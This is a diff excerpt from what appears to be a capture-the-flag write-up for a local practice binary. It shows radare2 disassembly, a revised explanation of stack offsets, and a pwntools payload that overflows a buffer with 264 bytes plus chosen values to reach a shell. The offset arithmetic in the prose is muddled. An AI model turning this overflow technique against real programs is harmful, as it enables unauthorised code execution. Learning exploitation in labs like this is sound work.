@@ -48,7 +48,7 @@ Then we run ```r2 -Ad a.out``` to disassemble the file in debug mode and then en
 └           0x55892799a20b      c3             ret                                                                                                                                
             0x55892799a20c      0f1f4000       nop dword [rax]
 ```
-The difference with this one compared to the previous one is that this has two variables we need to input ```rbp-0x8``` and ```0x4```. The ```cmp``` that matters to us is with ```0x4``` but the ```0x8``` comparison adds the the gap with ```0x4``` so we do ```0x110-0x4``` to get ```268```. Since ```0x4``` is being added to the stack we subtract ```4``` more to get to ```264```. 
+The difference with this one compared to the previous one is that this has two variables we need to input ```rbp-0x8``` and ```0x4```. The ```cmp``` that matters to us is with ```rbp-0x8``` but the ```rbp-0x4``` comparison adds the the gap with ```0x4``` so we do ```0x110-0x4``` to get ```268```. Since ```0x4``` is being added to the stack we subtract ```4``` more to get to ```264```. 
 We hop on to ipython3 and ```from pwn import *``` and create a process with ```p = process ("./a.out")``` and send the junk to fill the space provided along with the new value we want to compare with ```p.sendline(b'A' * 264 + p32(0x1337) + p32(0x69696969))```
 
 then run ```p.interactive()``` to get shell
